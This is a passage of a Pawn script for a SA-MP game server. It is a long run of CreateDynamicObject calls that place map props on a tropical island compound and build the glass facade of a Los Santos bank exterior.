	CreateDynamicObject(3525,3537.79614258,161.25819397,7.19266748,0.00000000,0.00000000,37.99072266); //object(exbrtorch01) (3)
	CreateDynamicObject(897,3544.20776367,204.24893188,-1.89999199,0.00000000,0.00000000,261.73596191); //object(searock01) (3)
	CreateDynamicObject(897,3545.87597656,203.54098511,-1.89999199,0.00000000,0.00000000,261.73278809); //object(searock01) (3)
	CreateDynamicObject(3261,3402.71582031,85.08398438,6.98449850,354.24316406,0.00000000,49.74609375); //object(grasshouse) (1)
	CreateDynamicObject(3261,3400.47656250,87.00683594,6.68449736,354.24316406,0.00000000,49.74609375); //object(grasshouse) (1)
	CreateDynamicObject(2901,3404.90625000,89.73925781,7.82408333,352.47436523,20.16540527,42.74230957); //object(kmb_marijuana) (1)
	CreateDynamicObject(2901,3405.31054688,89.44335938,7.87408352,352.47436523,20.16540527,42.74230957); //object(kmb_marijuana) (1)
	CreateDynamicObject(1646,3342.00683594,-62.87207031,2.34357405,0.00000000,0.00000000,351.24389648); //object(lounge_towel_up) (1)
	CreateDynamicObject(1646,3344.18066406,-63.15234375,2.34356904,0.00000000,0.00000000,351.49108887); //object(lounge_towel_up) (2)
	CreateDynamicObject(1821,3342.67089844,-62.72309113,1.98113716,0.00000000,0.00000000,351.99096680); //object(coffee_low_1) (1)
	CreateDynamicObject(1510,3343.30566406,-62.25976562,2.51959276,0.00000000,0.00000000,0.00000000); //object(dyn_ashtry) (2)
	CreateDynamicObject(1485,3343.10961914,-62.20200729,2.54202509,0.00000000,0.00000000,0.00000000); //object(cj_ciggy) (2)
	CreateDynamicObject(14872,3304.95019531,12.43457031,2.67883015,0.00000000,0.97778320,189.98657227); //object(kylie_logs) (5)
	CreateDynamicObject(1608,3493.63183594,245.08523560,-0.87500739,359.50024414,358.24990845,127.98452759); //object(shark) (1)
	CreateDynamicObject(3361,3506.42285156,203.62011719,13.79426193,0.00000000,351.99645996,335.99487305); //object(cxref_woodstair) (1)
	CreateDynamicObject(1255,3285.83007812,-38.26367188,3.77558613,0.00000000,0.00000000,271.99401855); //object(lounger) (2)
	CreateDynamicObject(1255,3288.03320312,-38.71875000,3.77558613,0.00000000,0.00000000,235.99182129); //object(lounger) (2)
	CreateDynamicObject(3261,3401.79492188,79.36523438,7.35949993,354.74304199,0.00000000,49.74609375); //object(grasshouse) (1)
	CreateDynamicObject(3261,3399.50097656,81.29101562,7.03449869,354.24316406,0.00000000,49.74609375); //object(grasshouse) (1)
	CreateDynamicObject(3261,3397.17480469,83.20605469,6.75949764,354.24316406,0.00000000,49.74609375); //object(grasshouse) (1)
	CreateDynamicObject(1821,3286.56738281,-37.69726562,3.15614820,0.00000000,0.00000000,343.99291992); //object(coffee_low_1) (1)
	CreateDynamicObject(1510,3287.27441406,-37.43847656,3.66848373,0.00000000,0.00000000,0.00000000); //object(dyn_ashtry) (1)
	CreateDynamicObject(1485,3287.09033203,-37.39478302,3.67416716,340.36193848,348.57421875,356.11083984); //object(cj_ciggy) (1)
	CreateDynamicObject(642,3268.01855469,122.37890625,4.73886251,0.73059082,358.49487305,353.25988770); //object(kb_canopy_test) (3)
	CreateDynamicObject(3461,3285.23242188,-14.99336529,8.77375126,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (3)
	CreateDynamicObject(3461,3407.04199219,87.43554688,8.39876080,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (4)
	CreateDynamicObject(1463,3325.61914062,91.84570312,3.73819780,0.00000000,0.00000000,69.24682617); //object(dyn_woodpile2) (1)
	CreateDynamicObject(18228,3548.44824219,118.96370697,-1.25000000,0.00000000,353.99597168,355.98706055); //object(cunt_rockgp2_21) (7)
	CreateDynamicObject(17554,3533.21557617,135.91055298,-11.32499886,0.00000000,0.00000000,216.25000000); //object(beachblok5_lae2) (4)
	CreateDynamicObject(18228,3558.58007812,141.28417969,-1.47499931,0.00000000,353.99597168,77.73376465); //object(cunt_rockgp2_21) (7)
	CreateDynamicObject(897,3493.05444336,199.22874451,4.57501078,0.00000000,0.00000000,121.97912598); //object(searock01) (3)
	CreateDynamicObject(897,3426.84057617,94.27156830,1.97499657,36.59179688,101.05233765,327.06854248); //object(searock01) (3)
	CreateDynamicObject(642,3264.39746094,114.38964844,4.78886271,0.73059082,358.49487305,353.25988770); //object(kb_canopy_test) (3)
	CreateDynamicObject(897,3288.55297852,126.33615875,-2.25000644,0.00000000,21.99462891,295.97619629); //object(searock01) (3)
	CreateDynamicObject(3741,3374.77832031,187.18359375,3.06138277,0.00000000,0.00000000,155.99487305); //object(cehillhse14) (2)
	CreateDynamicObject(3771,3374.76123047,187.19036865,3.05613208,0.00000000,0.00000000,156.00000000); //object(cehillhse14_alpha) (3)
	CreateDynamicObject(3886,3348.09277344,215.06835938,1.43561018,0.00000000,0.49987793,156.73645020); //object(ws_jettynol_sfx) (7)
	CreateDynamicObject(3886,3352.23242188,224.69335938,1.43561018,0.00000000,0.49987793,156.73645020); //object(ws_jettynol_sfx) (7)
	CreateDynamicObject(3886,3353.67382812,209.81640625,1.41061020,0.00000000,0.49987793,66.71997070); //object(ws_jettynol_sfx) (7)
	CreateDynamicObject(3886,3357.54003906,218.70312500,1.38561022,0.00000000,0.49987793,66.71447754); //object(ws_jettynol_sfx) (7)
	CreateDynamicObject(3886,3361.21191406,227.63964844,1.48561013,0.00000000,0.49987793,246.46728516); //object(ws_jettynol_sfx) (7)
	CreateDynamicObject(3886,3352.88671875,231.24511719,1.43561018,359.48913574,359.48913574,66.47827148); //object(ws_jettynol_sfx) (7)
	CreateDynamicObject(11494,3355.52148438,214.39941406,1.94999659,0.00000000,0.00000000,21.24206543); //object(des_rnchbhous) (1)
	CreateDynamicObject(11494,3359.32226562,223.27050781,1.99999654,0.00000000,0.00000000,20.99487305); //object(des_rnchbhous) (1)
	CreateDynamicObject(12958,3378.37695312,174.58789062,7.51168203,0.00000000,0.00000000,335.99487305); //object(cos_sbanksteps01) (6)
	CreateDynamicObject(12958,3397.72070312,184.92285156,7.53668213,0.00000000,0.00000000,157.24182129); //object(cos_sbanksteps01) (7)
	CreateDynamicObject(18228,3421.84155273,180.66690063,-11.19999313,0.00000000,355.98449707,313.24487305); //object(cunt_rockgp2_21) (3)
	CreateDynamicObject(3877,3504.58813477,10.69543839,7.63337326,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)
	CreateDynamicObject(3877,3499.80688477,15.28682423,7.63337326,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (2)
	CreateDynamicObject(3461,3366.29687500,173.01660156,8.34876251,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (4)
	CreateDynamicObject(3461,3369.08398438,171.83496094,8.37376213,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (4)
	CreateDynamicObject(4206,3357.72656250,191.49414062,3.81209850,0.00000000,0.00000000,0.00000000); //object(pershingpool_lan) (2)
	CreateDynamicObject(8656,3357.63110352,186.87988281,2.81242418,0.00000000,0.00000000,66.00000000); //object(shbbyhswall09_lvs) (1)
	CreateDynamicObject(8656,3357.20800781,185.94335938,2.81242418,0.00000000,0.00000000,65.98937988); //object(shbbyhswall09_lvs) (2)
	CreateDynamicObject(1255,3350.81201172,205.12094116,4.45059109,0.00000000,0.00000000,283.99658203); //object(lounger) (3)
	CreateDynamicObject(1255,3352.58447266,205.48318481,4.45059109,0.00000000,0.00000000,283.99658203); //object(lounger) (3)
	CreateDynamicObject(8656,3358.88964844,-39.15117264,4.48743057,0.00000000,0.00000000,351.49108887); //object(shbbyhswall09_lvs) (4)
	CreateDynamicObject(3877,3379.23242188,185.99316406,10.48338318,0.00000000,0.00000000,336.74743652); //object(sf_rooflite) (5)
	CreateDynamicObject(3877,3391.46777344,180.64550781,10.48338318,0.00000000,0.00000000,336.74194336); //object(sf_rooflite) (6)
	CreateDynamicObject(4247,3380.91992188,212.09570312,-12.87005043,0.00000000,0.00000000,0.00000000); //object(sbsbed6law2) (1)
	CreateDynamicObject(4247,3629.09960938,212.39550781,-13.72003174,0.00000000,0.00000000,0.00000000); //object(sbsbed6law2) (2)
	CreateDynamicObject(3264,3483.35522461,22.51447296,2.41403818,0.00000000,0.00000000,135.99877930); //object(privatesign3) (1)
	CreateDynamicObject(3505,3411.97265625,46.50097656,3.63460159,0.00000000,0.00000000,75.99792480); //object(vgsn_nitree_y01) (2)
	CreateDynamicObject(3505,3402.81445312,27.90820312,4.00959873,0.00000000,0.00000000,155.99487305); //object(vgsn_nitree_y01) (4)
	CreateDynamicObject(3877,3450.61083984,141.73870850,6.48337269,0.00000000,0.00000000,306.24194336); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3434.79882812,130.30332947,6.48337269,0.00000000,0.00000000,306.23840332); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3445.89453125,114.87946320,6.48337269,0.00000000,0.00000000,306.23840332); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3461.68579102,126.27114868,6.48337269,0.00000000,0.00000000,306.23840332); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3469.91308594,114.64994812,6.48337269,0.00000000,0.00000000,306.23840332); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3454.06225586,103.24716949,6.48337269,0.00000000,0.00000000,306.23840332); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3465.25805664,87.82464600,6.48337269,0.00000000,0.00000000,306.23840332); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3481.04052734,99.23443604,6.48337269,0.00000000,0.00000000,306.23840332); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3515.96435547,124.09397125,6.48337269,0.00000000,0.00000000,306.23840332); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3500.52807617,113.03038025,6.48337269,0.00000000,0.00000000,306.23840332); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3489.11401367,128.84719849,6.48337269,0.00000000,0.00000000,306.23840332); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3504.53833008,139.95582581,6.48337269,0.00000000,0.00000000,306.23840332); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3496.14624023,151.47569275,6.48337269,0.00000000,0.00000000,306.23840332); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3484.77441406,167.30107117,6.48337269,0.00000000,0.00000000,306.23840332); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3469.35253906,156.18927002,6.48337269,0.00000000,0.00000000,306.23840332); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3480.68164062,140.34773254,6.48337269,0.00000000,0.00000000,306.23840332); //object(sf_rooflite) (6)
	CreateDynamicObject(3505,3426.72924805,87.72484589,3.70960045,0.00000000,0.00000000,97.99255371); //object(vgsn_nitree_y01) (2)
	CreateDynamicObject(3877,3347.93334961,18.60306740,3.10837221,0.00000000,0.00000000,292.23840332); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3354.92822266,0.97737420,3.10837221,0.00000000,0.00000000,292.23632812); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3336.89624023,-6.25504637,3.10837221,0.00000000,0.00000000,292.23632812); //object(sf_rooflite) (6)
	CreateDynamicObject(3877,3329.83691406,11.34818077,3.10837221,0.00000000,0.00000000,292.23632812); //object(sf_rooflite) (6)
	CreateDynamicObject(1231,3442.00976562,145.61914062,6.75706577,0.00000000,0.00000000,216.48559570); //object(streetlamp2) (18)
	CreateDynamicObject(16375,3401.64062500,164.21191406,10.62500572,0.49987793,0.00000000,337.24731445); //object(by_helimarkings) (3)
	CreateDynamicObject(13681,3353.05078125,89.36035156,6.86512756,0.00000000,0.00000000,249.99935913); //object(tcehilhouse03) (1)
	CreateDynamicObject(17699,3361.79199219,111.64648438,6.59516001,0.00000000,0.00000000,159.99389648); //object(mcstraps_lae2) (1)
	CreateDynamicObject(1535,3356.75683594,112.09472656,2.87948394,0.00000000,0.00000000,69.74670410); //object(gen_doorext14) (1)
	CreateDynamicObject(9259,3338.07006836,50.17156219,7.34430933,0.00000000,0.00000000,339.99938965); //object(preshoosbig02_sfn) (1)
	CreateDynamicObject(13701,3430.60351562,-39.03320312,3.62502193,0.00000000,0.00000000,14.49096680); //object(tcehilouse02) (1)
	CreateDynamicObject(18228,3514.20019531,94.36603546,-1.25000000,0.00000000,0.00000000,171.98840332); //object(cunt_rockgp2_21) (6)
	CreateDynamicObject(12839,3452.13183594,-36.35839844,7.32222128,0.00000000,0.00000000,194.49096680); //object(cos_sbanksteps02) (1)
	CreateDynamicObject(12839,3449.57568359,-42.06187057,1.09721434,0.00000000,0.00000000,103.98559570); //object(cos_sbanksteps02) (2)
	CreateDynamicObject(3886,3446.28808594,-52.08886719,2.18561029,0.00000000,359.98352051,14.46899414); //object(ws_jettynol_sfx) (13)
	CreateDynamicObject(3886,3443.20996094,-60.28417969,1.93560970,0.00000000,359.48913574,284.47448730); //object(ws_jettynol_sfx) (13)
	CreateDynamicObject(3886,3453.35546875,-57.67089844,1.93560970,0.00000000,359.48913574,284.47448730); //object(ws_jettynol_sfx) (13)
	CreateDynamicObject(1472,3450.54296875,-33.16894531,9.38007355,0.00000000,0.00000000,284.74365234); //object(dyn_porch_1) (1)
	CreateDynamicObject(1472,3445.02734375,-47.16601562,2.63004065,0.00000000,0.00000000,193.99108887); //object(dyn_porch_1) (2)
	CreateDynamicObject(18241,3344.05761719,69.30566406,2.15292788,0.00000000,0.00000000,250.24658203); //object(cuntw_weebuild) (1)
	CreateDynamicObject(3820,3275.18457031,57.78808594,6.41919184,0.00000000,0.00000000,15.99609375); //object(box_hse_09_sfxrf) (2)
	CreateDynamicObject(689,3341.51025391,162.58235168,1.60782003,0.00000000,0.00000000,30.00000000); //object(sm_fir_copse1) (5)
	CreateDynamicObject(3524,3498.22656250,214.52343750,11.80905342,0.00000000,0.00000000,191.99705505); //object(skullpillar01_lvs) (2)
	CreateDynamicObject(3886,3358.96582031,-56.70800781,1.41061020,0.00000000,0.49987793,171.46911621); //object(ws_jettynol_sfx) (13)
	CreateDynamicObject(3886,3358.12109375,-62.34277344,1.41061020,0.00000000,0.49987793,171.46911621); //object(ws_jettynol_sfx) (13)
	CreateDynamicObject(2064,3356.56347656,-53.43359375,9.38732433,0.00000000,0.00000000,26.98791504); //object(cj_feildgun) (1)
	CreateDynamicObject(2359,3353.44335938,-53.06445312,9.21838570,0.00000000,0.00000000,169.74975586); //object(ammo_box_c5) (1)
	CreateDynamicObject(2061,3354.53710938,-52.68359375,9.05005646,0.00000000,0.00000000,0.00000000); //object(cj_shells1) (2)
	CreateDynamicObject(2061,3353.60156250,-53.03613281,9.17508888,90.00000000,177.71484375,261.78222656); //object(cj_shells1) (3)
	CreateDynamicObject(3092,3334.98242188,-61.95996094,2.13161802,322.30590820,275.23498535,80.97473145); //object(dead_tied_cop) (1)
	CreateDynamicObject(3092,3335.00976562,-63.30468750,2.25661850,90.00000000,179.30236816,346.69006348); //object(dead_tied_cop) (2)
	CreateDynamicObject(3265,3478.27148438,50.71289062,2.91976333,0.00000000,0.00000000,61.99035645); //object(privatesign4) (2)
	CreateDynamicObject(14872,3302.02539062,16.44140625,2.65383005,0.00000000,357.98950195,47.98278809); //object(kylie_logs) (5)
	CreateDynamicObject(14872,3297.00781250,13.05957031,2.65383005,0.00000000,0.97778320,345.48156738); //object(kylie_logs) (5)
	CreateDynamicObject(2064,3281.34277344,111.81152344,8.96233082,0.00000000,0.00000000,275.72937012); //object(cj_feildgun) (1)
	CreateDynamicObject(3279,3252.73339844,-0.08550531,5.74851322,0.00000000,0.00000000,193.99995422); //object(a51_spottower) (1)
	CreateDynamicObject(8656,3338.14331055,-33.59331131,5.13743305,0.00000000,0.00000000,261.49108887); //object(shbbyhswall09_lvs) (4)
	CreateDynamicObject(8656,3429.48242188,-18.95703125,7.83743668,0.00000000,0.00000000,103.98559570); //object(shbbyhswall09_lvs) (4)
	CreateDynamicObject(3461,3288.65625000,-16.11857414,8.77375126,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (3)
	CreateDynamicObject(17554,3411.90234375,-37.25146103,-13.67793655,0.00000000,0.00000000,105.49072266); //object(beachblok5_lae2) (2)
	CreateDynamicObject(18228,3384.75195312,-45.67578125,-3.75000000,0.00000000,3.98803711,135.96130371); //object(cunt_rockgp2_21) (6)
	CreateDynamicObject(5172,3449.84082031,50.69531250,2.63437748,0.00000000,356.24816895,335.99487305); //object(beach1spt_las2) (1)
	CreateDynamicObject(897,3430.52929688,102.70242310,2.04999661,36.58996582,101.05224609,357.06842041); //object(searock01) (3)
	CreateDynamicObject(897,3445.82763672,60.95326614,-3.52500343,24.47924805,97.36697388,35.63262939); //object(searock01) (3)
	CreateDynamicObject(897,3448.91357422,56.14521027,-3.52500343,24.47753906,97.36633301,39.62866211); //object(searock01) (3)
	CreateDynamicObject(3095,3426.46582031,65.91992188,2.11495590,3.91662598,11.52465820,358.69812012); //object(a51_jetdoor) (1)
	CreateDynamicObject(1637,3413.61206055,35.09379959,3.68122721,0.00000000,0.00000000,346.00000000); //object(od_pat_hutb) (1)
	CreateDynamicObject(1640,3426.18432617,41.39079666,1.51039934,7.74813843,1.26150513,51.82992554); //object(beachtowel04) (1)
	CreateDynamicObject(1642,3426.91918945,42.51531219,1.54155922,7.24826050,1.26007080,52.59100342); //object(beachtowel02) (1)
	CreateDynamicObject(2404,3426.79321289,39.35342407,2.43536139,0.00000000,180.00000000,68.00000000); //object(cj_surf_board) (1)
	CreateDynamicObject(2405,3425.94531250,38.02892303,1.42442799,280.76281738,68.41601562,68.06591797); //object(cj_surf_board2) (1)
	CreateDynamicObject(2406,3426.57861328,38.82720184,2.37160826,0.00000000,179.99993896,62.00000000); //object(cj_surf_board3) (1)
	CreateDynamicObject(1461,3432.28955078,38.30031586,1.37035692,0.00000000,0.00000000,70.00000000); //object(dyn_life_p) (1)
	CreateDynamicObject(1461,3426.16601562,22.81116486,1.37035692,0.00000000,0.00000000,69.99938965); //object(dyn_life_p) (2)
	CreateDynamicObject(3461,3404.28051758,17.71980667,4.36721277,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (1)
	CreateDynamicObject(3461,3415.48291016,34.05966187,3.44220924,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (1)
	CreateDynamicObject(642,3425.80273438,42.65306091,2.66386414,348.73477173,358.46542358,352.94085693); //object(kb_canopy_test) (4)
	CreateDynamicObject(642,3421.35986328,27.91976357,2.51386833,10.67944336,354.39416504,354.27844238); //object(kb_canopy_test) (4)
	CreateDynamicObject(1646,3422.16430664,29.21160316,1.61856818,7.96170044,354.44128418,96.26159668); //object(lounge_towel_up) (2)
	CreateDynamicObject(13011,3410.47875977,-26.91860199,5.45455217,0.74975586,358.49987793,284.26968384); //object(cos_sbanksteps04) (1)
	CreateDynamicObject(1646,3422.54223633,27.38458633,1.49356830,7.95959473,354.44091797,96.25671387); //object(lounge_towel_up) (2)
	CreateDynamicObject(1637,3402.41015625,17.70956230,4.58122683,0.00000000,0.00000000,13.99792480); //object(od_pat_hutb) (2)
	CreateDynamicObject(3886,3339.87475586,195.79577637,1.43561018,0.00000000,0.49987793,337.47271729); //object(ws_jettynol_sfx) (7)
	CreateDynamicObject(1215,3430.09277344,-18.81657600,9.35496521,0.00000000,0.00000000,0.00000000); //object(bollardlight) (17)
	CreateDynamicObject(1215,3419.16406250,-21.49597931,9.35496521,0.00000000,0.00000000,0.00000000); //object(bollardlight) (17)
	CreateDynamicObject(3928,3354.05712891,-47.26877213,8.75812149,0.00000000,0.00000000,261.50000000); //object(helipad) (1)
	CreateDynamicObject(3934,3354.88061523,93.07273865,7.08530235,0.00000000,0.00000000,339.25000000); //object(helipad01) (2)
	CreateDynamicObject(3785,3353.76440430,-54.38014984,0.49406037,0.00000000,0.00000000,259.24096680); //object(bulkheadlight) (3)
	CreateDynamicObject(3884,3252.57934570,0.11839311,21.34999847,0.00000000,0.00000000,124.00000000); //object(samsite_sfxrf) (1)

	// New L.S Local bank Exterior
	CreateDynamicObject(1649, 1448.4000244141, -1015.200012207, 30.049999237061, 0, 0, 180);
	CreateDynamicObject(1649, 1444.0999755859, -1015.200012207, 30.049999237061, 0, 0, 180);
	CreateDynamicObject(1649, 1439.8000488281, -1015.200012207, 30.049999237061, 0, 0, 180);
	CreateDynamicObject(1649, 1431, -1015.200012207, 30.049999237061, 0, 0, 180);
	CreateDynamicObject(3440, 1437.5999755859, -1015.200012207, 32.299999237061, 0, 0, 0);
	CreateDynamicObject(3440, 1441.9000244141, -1015.200012207, 32.299999237061, 0, 0, 0);
	CreateDynamicObject(3440, 1446.3000488281, -1015.200012207, 32.299999237061, 0, 0, 0);
	CreateDynamicObject(3440, 1433.0999755859, -1015.200012207, 32.299999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1435.5, -1015.19921875, 26.799999237061, 0, 0, 0);
	CreateDynamicObject(3440, 1433.099609375, -1015.19921875, 27.60000038147, 0, 0, 0);
	CreateDynamicObject(3440, 1437.599609375, -1015.19921875, 27.60000038147, 0, 0, 0);
	CreateDynamicObject(3440, 1441.8994140625, -1015.19921875, 27.60000038147, 0, 0, 0);
	CreateDynamicObject(3440, 1446.2998046875, -1015.19921875, 27.60000038147, 0, 0, 0);
	CreateDynamicObject(1649, 1431, -1015.19921875, 26.799999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1435.5, -1015.19921875, 30.049999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1439.7998046875, -1015.19921875, 26.799999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1444.099609375, -1015.19921875, 26.799999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1448.3994140625, -1015.19921875, 26.799999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1431, -1015.19921875, 26.799999237061, 0, 0, 180);
	CreateDynamicObject(1649, 1435.5, -1015.19921875, 26.799999237061, 0, 0, 180);
	CreateDynamicObject(1649, 1439.7998046875, -1015.19921875, 26.799999237061, 0, 0, 180);
	CreateDynamicObject(1649, 1444.099609375, -1015.19921875, 26.799999237061, 0, 0, 180);
	CreateDynamicObject(1649, 1448.3994140625, -1015.19921875, 26.799999237061, 0, 0, 180);
	CreateDynamicObject(1649, 1448.3994140625, -1015.19921875, 30.049999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1444.099609375, -1015.19921875, 30.049999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1439.7998046875, -1015.19921875, 30.049999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1435.5, -1015.19921875, 30.049999237061, 0, 0, 180);
	CreateDynamicObject(1649, 1431, -1015.19921875, 30.049999237061, 0, 0, 0);
	CreateDynamicObject(3440, 1450.5, -1015.200012207, 27.60000038147, 0, 0, 0);
	CreateDynamicObject(3440, 1450.5, -1015.19921875, 32.299999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1451.8000488281, -1016.799987793, 30.049999237061, 0, 0, 90);
	CreateDynamicObject(1649, 1450.6999511719, -1017.200012207, 26.799999237061, 0, 0, 270);
	CreateDynamicObject(1649, 1450.69921875, -1017.19921875, 30.049999237061, 0, 0, 270);
	CreateDynamicObject(1649, 1451.7998046875, -1016.7998046875, 26.799999237061, 0, 0, 90);
	CreateDynamicObject(1649, 1475.6999511719, -1015.19921875, 26.799999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1480.0999755859, -1015.200012207, 30.049999237061, 0, 0, 180);
	CreateDynamicObject(1649, 1484.5, -1015.200012207, 30.049999237061, 0, 0, 180);
	CreateDynamicObject(1649, 1488.9000244141, -1015.200012207, 30.049999237061, 0, 0, 180);
	CreateDynamicObject(3440, 1477.9000244141, -1015.19921875, 27.700000762939, 0, 0, 0);
	CreateDynamicObject(3440, 1482.3000488281, -1015.19921875, 27.700000762939, 0, 0, 0);
	CreateDynamicObject(3440, 1486.6999511719, -1015.19921875, 27.700000762939, 0, 0, 0);
	CreateDynamicObject(3440, 1491.0999755859, -1015.19921875, 27.700000762939, 0, 0, 0);
	CreateDynamicObject(3440, 1473.5, -1015.19921875, 27.700000762939, 0, 0, 0);
	CreateDynamicObject(1649, 1475.69921875, -1015.19921875, 30.049999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1480.099609375, -1015.19921875, 26.799999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1484.5, -1015.19921875, 26.799999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1488.8994140625, -1015.19921875, 26.799999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1475.69921875, -1015.19921875, 26.799999237061, 0, 0, 180);
	CreateDynamicObject(1649, 1475.69921875, -1015.19921875, 30.049999237061, 0, 0, 180);
	CreateDynamicObject(1649, 1480.099609375, -1015.19921875, 30.049999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1480.099609375, -1015.19921875, 26.799999237061, 0, 0, 180);
	CreateDynamicObject(1649, 1484.5, -1015.19921875, 26.799999237061, 0, 0, 180);
	CreateDynamicObject(1649, 1484.5, -1015.19921875, 30.049999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1488.8994140625, -1015.19921875, 30.049999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1473.3000488281, -1016.5999755859, 30.049999237061, 0, 0, 90);
	CreateDynamicObject(1649, 1472.1999511719, -1016.5, 26.799999237061, 0, 0, 270);
	CreateDynamicObject(1649, 1473.2998046875, -1016.599609375, 26.799999237061, 0, 0, 90);
	CreateDynamicObject(1649, 1472.19921875, -1016.5, 30.049999237061, 0, 0, 270);
	CreateDynamicObject(3440, 1473.5, -1015.19921875, 32.299999237061, 0, 0, 0);
	CreateDynamicObject(3440, 1477.8994140625, -1015.19921875, 32.299999237061, 0, 0, 0);
	CreateDynamicObject(3440, 1482.2998046875, -1015.19921875, 32.299999237061, 0, 0, 0);
	CreateDynamicObject(3440, 1486.69921875, -1015.19921875, 32.299999237061, 0, 0, 0);
	CreateDynamicObject(3440, 1491.099609375, -1015.19921875, 32.299999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1488.8994140625, -1015.19921875, 26.799999237061, 0, 0, 179.99450683594);
	CreateDynamicObject(1649, 1493.1999511719, -1015.19921875, 26.799999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1493.19921875, -1015.19921875, 30.049999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1493.19921875, -1015.19921875, 26.799999237061, 0, 0, 180);
	CreateDynamicObject(1649, 1493.19921875, -1015.19921875, 30.049999237061, 0, 0, 180);
	CreateDynamicObject(3440, 1475.5, -1015.19921875, 25.200000762939, 0, 90, 0);
	CreateDynamicObject(3440, 1480, -1015.19921875, 25.200000762939, 0, 90, 0);
	CreateDynamicObject(3440, 1484.5999755859, -1015.19921875, 25.200000762939, 0, 90, 0);
	CreateDynamicObject(3440, 1476, -1015.19921875, 30.549999237061, 0, 90, 0);
	CreateDynamicObject(3440, 1480, -1015.19921875, 30.549999237061, 0, 90, 0);
	CreateDynamicObject(3440, 1484.599609375, -1015.19921875, 30.549999237061, 0, 90, 0);
	CreateDynamicObject(3440, 1489, -1015.19921875, 25.200000762939, 0, 90, 0);
	CreateDynamicObject(3440, 1493.5, -1015.19921875, 25.200000762939, 0, 90, 0);
	CreateDynamicObject(3440, 1489, -1015.19921875, 30.549999237061, 0, 90, 0);
	CreateDynamicObject(3440, 1493.5, -1015.19921875, 30.549999237061, 0, 90, 0);
	CreateDynamicObject(3440, 1430, -1015.200012207, 30.549999237061, 0, 90, 0);
	CreateDynamicObject(3440, 1448.5, -1015.19921875, 25.200000762939, 0, 90, 0);
	CreateDynamicObject(3440, 1443.7998046875, -1015.19921875, 25.200000762939, 0, 90, 0);
	CreateDynamicObject(3440, 1439.19921875, -1015.19921875, 25.200000762939, 0, 90, 0);
	CreateDynamicObject(3440, 1434.5, -1015.19921875, 25.200000762939, 0, 90, 0);
	CreateDynamicObject(3440, 1448.5, -1015.19921875, 30.549999237061, 0, 90, 0);
	CreateDynamicObject(3440, 1443.7998046875, -1015.19921875, 30.549999237061, 0, 90, 0);
	CreateDynamicObject(3440, 1439.19921875, -1015.19921875, 30.549999237061, 0, 90, 0);
	CreateDynamicObject(3440, 1434.5, -1015.19921875, 30.549999237061, 0, 90, 0);
	CreateDynamicObject(3440, 1430, -1015.19921875, 25.200000762939, 0, 90, 0);
	CreateDynamicObject(1649, 1457.9000244141, -1021.799987793, 22.5, 0, 0, 180);
	CreateDynamicObject(3440, 1460, -1021.799987793, 28.299999237061, 0, 0, 0);
	CreateDynamicObject(3440, 1462.4000244141, -1021.799987793, 30.5, 0, 90, 0);
	CreateDynamicObject(1649, 1457.8994140625, -1021.7998046875, 29, 0, 0, 0);
	CreateDynamicObject(1649, 1453.5, -1021.7998046875, 29, 0, 0, 0);
	CreateDynamicObject(3440, 1455.9000244141, -1021.799987793, 28.299999237061, 0, 0, 0);
	CreateDynamicObject(3440, 1451.1999511719, -1021.799987793, 28.299999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1451.1999511719, -1019.700012207, 29, 0, 0, 90);
	CreateDynamicObject(1649, 1451.1999511719, -1019.69921875, 29, 0, 0, 270);
	CreateDynamicObject(3440, 1464.6999511719, -1021.799987793, 28.299999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1466.6999511719, -1021.799987793, 22.5, 0, 0, 180);
	CreateDynamicObject(1649, 1470.6999511719, -1021.799987793, 22.5, 0, 0, 180);
	CreateDynamicObject(3440, 1468.6999511719, -1021.799987793, 28.299999237061, 0, 0, 0);
	CreateDynamicObject(3440, 1472.8000488281, -1021.799987793, 28.299999237061, 0, 0, 0);
	CreateDynamicObject(1649, 1472.8000488281, -1019.69921875, 22.5, 0, 0, 270);
	CreateDynamicObject(1649, 1472.7998046875, -1019.69921875, 29, 0, 0, 90);
